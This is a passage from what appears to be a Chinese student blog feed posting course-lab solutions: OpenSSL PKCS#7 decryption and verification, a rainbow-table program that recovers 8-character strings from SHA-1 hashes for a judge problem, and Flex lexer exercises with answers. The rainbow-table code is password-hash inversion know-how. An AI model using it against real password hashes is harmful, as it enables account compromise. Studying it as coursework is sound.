class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_pkcs7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BIO *bio_out,*mem;</span><br><span class="line">	PKCS7 *p7;</span><br><span class="line">	X509 *cert;</span><br><span class="line">  	X509_STORE *ca;</span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">70</span>],ans[<span class="number">5000</span>];</span><br><span class="line">	string str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> *out;</span><br><span class="line">	<span class="keyword">int</span> i,flags,num_signer;</span><br><span class="line">	EVP_PKEY* pKey = <span class="built_in">getpkey</span>(pkeyB);</span><br><span class="line"> 	ca=<span class="built_in">X509_STORE_new</span>();</span><br><span class="line">  	<span class="built_in">X509_STORE_add_cert</span>(ca,<span class="built_in">getX509</span>(cacert));</span><br><span class="line">  </span><br><span class="line"> 	<span class="keyword">while</span>(<span class="built_in">fgets</span>(buf,<span class="built_in"><span class="keyword">sizeof</span></span>(buf),stdin))&#123;</span><br><span class="line"> 		str+=buf;	</span><br><span class="line">	&#125;<span class="comment">//输入的PKCS#7字符串</span></span><br><span class="line"> 	str+=<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"> 	<span class="keyword">const</span> <span class="keyword">char</span> *s=str.<span class="built_in">c_str</span>();</span><br><span class="line">	mem=<span class="built_in">BIO_new_mem_buf</span>(s,<span class="built_in">strlen</span>(s));</span><br><span class="line">	p7 = <span class="built_in">PKCS7_new</span>();</span><br><span class="line">	p7= <span class="built_in">PEM_read_bio_PKCS7</span>(mem, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(p7==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	bio_out=<span class="built_in">PKCS7_dataDecode</span>(p7,pKey,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	len=<span class="built_in">BIO_read</span>(bio_out,ans,<span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line">	<span class="keyword">if</span>(len==<span class="number">-2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">STACK_OF</span>(PKCS7_SIGNER_INFO) *so=<span class="built_in">PKCS7_get_signer_info</span>(p7);</span><br><span class="line">	<span class="keyword">if</span>(so==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	num_signer=<span class="built_in">sk_PKCS7_SIGNER_INFO_num</span>(so);</span><br><span class="line">	PKCS7_SIGNER_INFO *si;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;num_signer;i++)&#123;</span><br><span class="line">		si=<span class="built_in">sk_PKCS7_SIGNER_INFO_value</span>(so,i);</span><br><span class="line">		X509_STORE_CTX* ct=<span class="built_in">X509_STORE_CTX_new</span>();</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">PKCS7_dataVerify</span>(ca,ct,bio_out,p7,si)!=<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ERROR\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,ans[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">OpenSSL_add_all_algorithms</span>();</span><br><span class="line">	<span class="built_in">gen_pkcs7</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="彩虹表"><a class="markdownIt-Anchor" href="#彩虹表"></a> 彩虹表</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/XX">oj | 彩虹表</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> SHA1_tmp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ModN 2176782336</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHA1_ROTL(a, b)                                                        \</span></span><br><span class="line">  (SHA1_tmp = (a),                                                             \</span><br><span class="line">   ((SHA1_tmp &gt;&gt; (<span class="number">32</span> - b)) &amp; (<span class="number">0x7fffffff</span> &gt;&gt; (<span class="number">31</span> - b))) | (SHA1_tmp &lt;&lt; b))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHA1_F(B, C, D, t)                                                     \</span></span><br><span class="line">  ((t &lt; <span class="number">40</span>) ? ((t &lt; <span class="number">20</span>) ? ((B &amp; C) | ((~B) &amp; D)) : (B ^ C ^ D))                \</span><br><span class="line">            : ((t &lt; <span class="number">60</span>) ? ((B &amp; C) | (B &amp; D) | (C &amp; D)) : (B ^ C ^ D)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Bstr[<span class="number">10000</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;, Estr[<span class="number">10000</span>][<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="comment">// mp用来保存链尾的字符串与链下标的对应关系</span></span><br><span class="line">map&lt;string, <span class="keyword">int</span>&gt; mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">getStr</span><span class="params">(<span class="keyword">unsigned</span> n, <span class="keyword">char</span> str[<span class="number">8</span>])</span> </span>&#123;</span><br><span class="line">  str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>, str[<span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">2</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">3</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  str[<span class="number">4</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">5</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">6</span>] = <span class="string">&#x27;0&#x27;</span>, str[<span class="number">7</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> tmp = n % <span class="number">36</span>;</span><br><span class="line">    <span class="keyword">if</span> (tmp &lt; <span class="number">10</span>)</span><br><span class="line">      str[i++] = tmp + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      str[i++] = tmp - <span class="number">10</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n = n / <span class="number">36</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">R</span><span class="params">(<span class="keyword">unsigned</span> sha1[<span class="number">5</span>], <span class="keyword">char</span> str[<span class="number">8</span>], <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">getStr</span>((sha1[<span class="number">0</span>] + sha1[<span class="number">1</span>] * i) % ModN, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">SHA1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">int</span> length, <span class="keyword">unsigned</span> sha1[<span class="number">5</span>])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *pp, *ppend;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l, i, K[<span class="number">80</span>], W[<span class="number">80</span>], TEMP, A, B, C, D, E, H0, H1, H2, H3, H4;</span><br><span class="line">  H0 = <span class="number">0x67452301</span>, H1 = <span class="number">0xEFCDAB89</span>, H2 = <span class="number">0x98BADCFE</span>, H3 = <span class="number">0x10325476</span>,</span><br><span class="line">  H4 = <span class="number">0xC3D2E1F0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">20</span>; K[i++] = <span class="number">0x5A827999</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">20</span>; i &lt; <span class="number">40</span>; K[i++] = <span class="number">0x6ED9EBA1</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">40</span>; i &lt; <span class="number">60</span>; K[i++] = <span class="number">0x8F1BBCDC</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">60</span>; i &lt; <span class="number">80</span>; K[i++] = <span class="number">0xCA62C1D6</span>)</span><br><span class="line">    ;</span><br><span class="line">  l = length + ((length % <span class="number">64</span> &gt; <span class="number">56</span>) ? (<span class="number">128</span> - length % <span class="number">64</span>) : (<span class="number">64</span> - length % <span class="number">64</span>));</span><br><span class="line">  <span class="keyword">if</span> (!(pp = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)l)))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; pp[i + <span class="number">3</span> - <span class="number">2</span> * (i % <span class="number">4</span>)] = str[i], i++)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> (pp[i + <span class="number">3</span> - <span class="number">2</span> * (i % <span class="number">4</span>)] = <span class="number">128</span>, i++; i &lt; l;</span><br><span class="line">       pp[i + <span class="number">3</span> - <span class="number">2</span> * (i % <span class="number">4</span>)] = <span class="number">0</span>, i++)</span><br><span class="line">    ;</span><br><span class="line">  *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(pp + l - <span class="number">4</span>)) = length &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(pp + l - <span class="number">8</span>)) = length &gt;&gt; <span class="number">29</span>;</span><br><span class="line">  <span class="keyword">for</span> (ppend = pp + l; pp &lt; ppend; pp += <span class="number">64</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; W[i] = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)pp)[i], i++)</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">16</span>; i &lt; <span class="number">80</span>;</span><br><span class="line">         W[i] = <span class="built_in">SHA1_ROTL</span>((W[i - <span class="number">3</span>] ^ W[i - <span class="number">8</span>] ^ W[i - <span class="number">14</span>] ^ W[i - <span class="number">16</span>]), <span class="number">1</span>),</span><br><span class="line">        i++)</span><br><span class="line">      ;</span><br><span class="line">    A = H0, B = H1, C = H2, D = H3, E = H4;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++) &#123;</span><br><span class="line">      TEMP = <span class="built_in">SHA1_ROTL</span>(A, <span class="number">5</span>) + <span class="built_in">SHA1_F</span>(B, C, D, i) + E + W[i] + K[i];</span><br><span class="line">      E = D, D = C, C = <span class="built_in">SHA1_ROTL</span>(B, <span class="number">30</span>), B = A, A = TEMP;</span><br><span class="line">    &#125;</span><br><span class="line">    H0 += A, H1 += B, H2 += C, H3 += D, H4 += E;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(pp - l);</span><br><span class="line">  sha1[<span class="number">0</span>] = H0, sha1[<span class="number">1</span>] = H1, sha1[<span class="number">2</span>] = H2, sha1[<span class="number">3</span>] = H3, sha1[<span class="number">4</span>] = H4;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> str[<span class="number">9</span>], <span class="keyword">unsigned</span> sha1[<span class="number">5</span>], <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> temporarySHA1[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">char</span> temporaryString[<span class="number">9</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(temporaryString, Bstr[index]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10000</span>; j++) &#123;</span><br><span class="line">    <span class="built_in">SHA1</span>(temporaryString, <span class="number">8</span>, temporarySHA1); <span class="comment">// 得到sha1</span></span><br><span class="line">    <span class="keyword">for</span> (l = <span class="number">0</span>; l &lt; <span class="number">5</span>; l++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (temporarySHA1[l] != sha1[l]) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l == <span class="number">5</span>) &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(str, temporaryString);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">R</span>(temporarySHA1, temporaryString, j % <span class="number">100</span> + <span class="number">1</span>); <span class="comment">// 得到str</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> sha1[<span class="number">5</span>], temporarySHA1[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, Bstr[i], Estr[i]);</span><br><span class="line">    string begin = <span class="built_in">string</span>(Bstr[i]);</span><br><span class="line">    string end = <span class="built_in">string</span>(Estr[i]);</span><br><span class="line">    mp.<span class="built_in">insert</span>(pair&lt;string, <span class="keyword">int</span>&gt;(end, i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%8x%8x%8x%8x%8x&quot;</span>, &amp;(sha1[<span class="number">0</span>]), &amp;(sha1[<span class="number">1</span>]), &amp;(sha1[<span class="number">2</span>]), &amp;(sha1[<span class="number">3</span>]),</span><br><span class="line">        &amp;(sha1[<span class="number">4</span>]));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)</span><br><span class="line">      temporarySHA1[j] = sha1[j];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10000</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">R</span>(temporarySHA1, str, (i + j) % <span class="number">100</span> + <span class="number">1</span>); <span class="comment">// 得到str</span></span><br><span class="line">      <span class="keyword">if</span> (mp.<span class="built_in">find</span>(str) != mp.<span class="built_in">end</span>()) &#123;</span><br><span class="line">        <span class="keyword">int</span> index = mp[str];</span><br><span class="line">        flag = <span class="built_in">find</span>(str, sha1, index);</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">SHA1</span>(str, <span class="number">8</span>, temporarySHA1); <span class="comment">// 得到sha1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;None\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
]]></content>
      <categories>
        <category>课程设计</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>课程设计</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理实验:Week1</title>
    <url>/2021/10/28/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C-Week1/</url>
    <content><![CDATA[<hr />
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>这里贴出来对第一周实验的代码记录，仅做个人记录所用。</p>
</div>
<hr />
<h3 id="第1关flex首次尝试"><a class="markdownIt-Anchor" href="#第1关flex首次尝试"></a> 第1关：Flex首次尝试</h3>
<p>记录输入的字符串的行数和字符的个数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num_lines=<span class="number">0</span>,num_chars=<span class="number">0</span>;</span><br><span class="line">%%</span><br><span class="line">\n ++num_lines;</span><br><span class="line">.  ++num_chars;</span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">yylex</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lines=%d,Chars=%d\n&quot;</span>,num_lines,num_chars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第2关简单pascal-like-toy语言识别补全"><a class="markdownIt-Anchor" href="#第2关简单pascal-like-toy语言识别补全"></a> 第2关：简单Pascal-like toy语言识别补全</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  <span class="comment">//Add a head file here</span></span><br><span class="line">%&#125;</span><br><span class="line">DIGIT [<span class="number">0</span><span class="number">-9</span>]</span><br><span class="line">ID [a-z][a-z0<span class="number">-9</span>]</span><br><span class="line">%%</span><br><span class="line">&#123;DIGIT&#125;+                 &#123;<span class="built_in">printf</span>( <span class="string">&quot;An integer: %s (%d)\n&quot;</span>, yytext,<span class="built_in">atoi</span>( yytext ) );&#125;</span><br><span class="line">&#123;DIGIT&#125;+<span class="string">&quot;.&quot;</span>&#123;DIGIT&#125;*      &#123;<span class="built_in">printf</span>( <span class="string">&quot;A float: %s (%g)\n&quot;</span>, yytext,<span class="built_in">atof</span>( yytext ) );&#125;<span class="comment">//动作</span></span><br><span class="line"><span class="keyword">if</span>|then|begin|end|procedure|function &#123;<span class="built_in">printf</span>( <span class="string">&quot;A keyword: %s\n&quot;</span>, yytext );&#125;<span class="comment">//关键字</span></span><br><span class="line">[a-z]+[a-z0<span class="number">-9</span>]* <span class="built_in">printf</span>( <span class="string">&quot;An identifier: %s\n&quot;</span>, yytext );</span><br><span class="line"><span class="string">&quot;+&quot;</span>|<span class="string">&quot;-&quot;</span>|<span class="string">&quot;*&quot;</span>|<span class="string">&quot;/&quot;</span>         <span class="built_in">printf</span>( <span class="string">&quot;An operator: %s\n&quot;</span>, yytext );</span><br><span class="line"><span class="string">&quot;&#123;&quot;</span>[^&#125;\n]*<span class="string">&quot;&#125;&quot;</span> 	<span class="comment">/* eat up one-line comments */</span></span><br><span class="line">[ \t\n]+ 		<span class="comment">/* eat up whitespace */</span></span><br><span class="line">.       <span class="built_in">printf</span>( <span class="string">&quot;Unrecognized character: %s\n&quot;</span>, yytext );</span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( argc, argv )</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> argc</span>;</span><br><span class="line"><span class="keyword">char</span> **argv;</span><br><span class="line">&#123;</span><br><span class="line">++argv, --argc; <span class="comment">/* skip over program name */</span></span><br><span class="line"><span class="keyword">if</span> ( argc &gt; <span class="number">0</span> )</span><br><span class="line">        yyin = <span class="built_in">fopen</span>( argv[<span class="number">0</span>], <span class="string">&quot;r&quot;</span> );</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        yyin = stdin;</span><br><span class="line">        <span class="built_in">yylex</span>();</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
<h3 id="第3关flex规则匹配顺序"><a class="markdownIt-Anchor" href="#第3关flex规则匹配顺序"></a> 第3关：Flex规则匹配顺序</h3>
<p>这一题是自己手动判断并输入自己判断得到的序列。也可以利用Flex进行编译运行代码获得答案，如果后续知道如何实现再添加。</p>
<p>待判断的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%%</span><br><span class="line">a*b             &#123;<span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);&#125;</span><br><span class="line">ca              &#123;<span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);&#125;</span><br><span class="line">a*ca*           &#123;<span class="built_in">printf</span>(<span class="string">&quot;3&quot;</span>);&#125;</span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">yylex</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入序列：abcaacacaaabbaaabcaaca </span><br><span class="line">答案：<span class="number">132311132</span></span><br></pre></td></tr></table></figure>
<h3 id="第4关flex词法规则补全pl语言"><a class="markdownIt-Anchor" href="#第4关flex词法规则补全pl语言"></a> 第4关：Flex词法规则补全（PL语言）</h3>
<p>这一题好难！呜呜呜。。。</p>
<p>需要注意标识符和字符常量的顺序，另外，关于大于小于那一块的判断，可以利用他们之间的顺序来进行放置（这样就不用判断先‘&gt;’再判断‘非=’了捏）。</p>
<p>还有不要忘了ERROR呀！</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* PL词法分析器 */</span></span><br><span class="line"><span class="comment">/* 功能：能够识别出PL支持的所有单词符号并给出种别值 */</span></span><br><span class="line"><span class="comment">/* 说明：在下面的begin和end之间添加代码，已经实现了标识符和整常量的识别，你需要完成剩下的部分，加油吧！ */</span></span><br><span class="line"><span class="comment">/* 提示：因为是顺序匹配，即从上至下依次匹配规则，所以需要合理安排顺序～ */</span></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">%&#125; <span class="comment">/*** begin ****/</span></span><br><span class="line"></span><br><span class="line">INTCON	     [\-]?[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]*|<span class="number">0</span></span><br><span class="line">CHARCON      \&#x27;[^&#x27;]*\&#x27;</span><br><span class="line">PLUS         <span class="string">&quot;+&quot;</span></span><br><span class="line">MINUS        <span class="string">&quot;-&quot;</span></span><br><span class="line">TIMES        <span class="string">&quot;*&quot;</span></span><br><span class="line">DIVSYM       <span class="string">&quot;/&quot;</span></span><br><span class="line">EQL          =</span><br><span class="line">NEQ          &lt;&gt;</span><br><span class="line">LEQ          &lt;=</span><br><span class="line">LSS          &lt;</span><br><span class="line">GEQ          &gt;=</span><br><span class="line">GTR          &gt;</span><br><span class="line">OFSYM        of</span><br><span class="line">ARRAYSYM     array</span><br><span class="line">PROGRAMSYM   program</span><br><span class="line">MODSYM       mod</span><br><span class="line">ANDSYM       <span class="keyword">and</span></span><br><span class="line">ORSYM        <span class="keyword">or</span></span><br><span class="line">NOTSYM       <span class="keyword">not</span></span><br><span class="line">LBRACK       \[</span><br><span class="line">RBRACK       \]</span><br><span class="line">LPAREN       \(</span><br><span class="line">RPAREN       \)</span><br><span class="line">COMMA        ,</span><br><span class="line">SEMICOLON    ;</span><br><span class="line">PERIOD       \.</span><br><span class="line">BECOME       :=</span><br><span class="line">COLON        :</span><br><span class="line">BEGINSYM     begin</span><br><span class="line">ENDSYM       end</span><br><span class="line">IFSYM        <span class="keyword">if</span></span><br><span class="line">THENSYM      then</span><br><span class="line">ELSESYM      <span class="keyword">else</span></span><br><span class="line">WHILESYM     <span class="keyword">while</span></span><br><span class="line">DOSYM        <span class="keyword">do</span></span><br><span class="line">CALLSYM      call</span><br><span class="line">CONSTSYM     <span class="keyword">const</span></span><br><span class="line">TYPESYM      type</span><br><span class="line">VARSYM       var</span><br><span class="line">PROCSYM      procedure</span><br><span class="line">IDENT        [A-Za-z][A-Za-z0<span class="number">-9</span>]*</span><br><span class="line">ERROR        [~!@#$%^&amp;_\\]</span><br><span class="line"></span><br><span class="line">%%  </span><br><span class="line"></span><br><span class="line">&#123;INTCON&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: INTCON\n&quot;</span>, yytext);&#125;</span><br><span class="line">&#123;PLUS&#125;           &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PLUS\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;MINUS&#125;          &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: MINUS\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;TIMES&#125;          &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: TIMES\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;DIVSYM&#125;         &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: DIVSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;EQL&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: EQL\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;NEQ&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: NEQ\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LSS&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: LSS\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LEQ&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: LEQ\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;GTR&#125;            &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: GTR\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;GEQ&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: GEQ\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;OFSYM&#125;		    &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: OFSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ARRAYSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ARRAYSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;PROGRAMSYM&#125;     &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PROGRAMSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;MODSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: MODSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ANDSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ANDSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ORSYM&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ORSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;NOTSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: NOTSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LBRACK&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: 